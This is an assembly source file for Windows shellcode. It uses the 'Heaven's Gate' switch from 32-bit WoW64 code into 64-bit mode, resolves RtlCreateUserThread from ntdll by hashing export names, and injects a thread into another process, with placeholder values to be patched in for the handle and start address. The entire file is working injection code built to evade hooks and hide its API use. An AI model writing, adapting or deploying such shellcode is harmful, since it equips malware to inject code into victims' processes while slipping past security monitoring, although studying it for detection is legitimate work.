BITS 64

; This shellcode goes through HEAVEN'S Gate in order to inject a thread into an x64 process

SECTION .data

SECTION .text

global _start

_start:
db		0cch
db 053h ; push ebx
db 051h ; push ecx
call to64
        ;32-bit code continues here	
	db 059h ; pop ecx
	db 05bh ; pop ebx
	ret
	
to64:
		jmp deltaheaven
backheaven:
		db 059h ; pop ecx	
		; double retf :)
		jmp deltahell
backhell:
		db 05bh ; pop ebx
		xor eax, eax				
		db 050h ; push eax	
		push 0x23				
		db 050h ; push eax ; retfq
		db 053h ; push ebx ; this will be consumed by the x64 mode
		
		push 0x33
		db 051h ; push ecx
		retf	
		
deltahell:
		call backhell
		ret ; this is going to be executed after x64 code completes
deltaheaven:
		call backheaven
enterHeaven:	
	; 64-bit code goes here
		push rbp
		push rsi
		push rdi
		push rdx
		push r8
		push r9
		push r10
		push r11
		push r12
		push r13
		push r14
		push r15  
		
		; Resolve NTDLL (x64) base
		mov rax, [gs:0x60]
        mov rax, [rax+18h]
        mov rax, [rax+30h]
        mov rax, [rax+10h]
		;resolve RtlCreateUserThread 
		mov r8, rax
		xor r9, r9
		mov r9d, 0x442f2041 ; RtlCreateUserThread - hashed
		call resolve_symbol
		
		; call RtlCreateUserThread
		xor rcx, rcx 
		mov rcx, 0x9090909090909090 ; ProcessHandle
		xor rdx, rdx ; NULL SecurityDescriptor
		xor r8, r8 ; FALSE CreateSuspended
		xor r9, r9 ; NULL StackZeroBits
		sub rsp, 0x68
		mov [rsp+0x20], r9 ; NULL StackReserved
		mov [rsp+0x28], r9 ; NULL StackCommit
		mov rbx, 0x9090909090909090 ; StartAddress
		mov [rsp+0x30], rbx
		mov rbx, 0x9090909090909090 ; StartParameter
		mov [rsp+0x38], rbx
		mov rbx, 0x9090909090909090 ; &ThreadHandle
		mov [rsp+0x40], rbx
		mov [rsp+0x48], r9 ; NULL ClientID
		call rax
		add rsp, 0x68 ; clean the stack parameters
		
		
		; restore everything etc..
		pop r15
		pop r14
		pop r13
		pop r12
		pop r11
		pop r10
		pop r9
		pop r8
		pop rdx
		pop rdi
		pop rsi
		pop rbp
		
exitHeaven:
        retf
	

resolve_symbol: ; (base dll, hashed function name)
	; first argument in r8, second in r9d
	push rdi
	push rcx
	push rbx
	push rdx
	xor rbx, rbx
	xor rcx, rcx
	xor rdi, rdi
	mov edi, [dword r8 + 0x3c]; // PE header
	mov edi, [dword r8 + rdi + 0x88]; // export section rva
	add rdi, r8;
	mov ecx, [dword rdi + 0x18]; //number of symbols of the dll
	mov ebx, [dword rdi + 0x20]; //rva symbol - Address of Names (RVAs)
	add rbx, r8;
search_iteration:
	test rcx, rcx;
	je search_failed;
	dec rcx;
	mov esi, [dword rbx + rcx * 4];
	add rsi, r8;
	;hashing the function name to comparison
compute_hash:
	xor rdx, rdx;
	xor rax, rax;
	cld;
compute_hash_again:
	lodsb;
	test al, al;
	jz compare_function;
	ror edx, 0x0d;
	add edx, eax;
	jmp compute_hash_again;
compare_function:
	cmp edx, r9d; //2nd argument -&gt; hashed name
	jnz search_iteration;
	mov edx, [dword rdi + 0x24]; Address of name ordinals
	add rdx, r8;
	mov ecx, [dword rdx + rcx * 2] ; get ordinal index
	and ecx, 0xffff
	mov edx, [dword rdi + 0x1c]; Address of functions
	add rdx, r8;
	mov eax, [dword rdx + rcx * 4];
	add rax, r8;	
	pop rdx
	pop rbx
	pop rcx
	pop rdi
search_failed:
	ret;
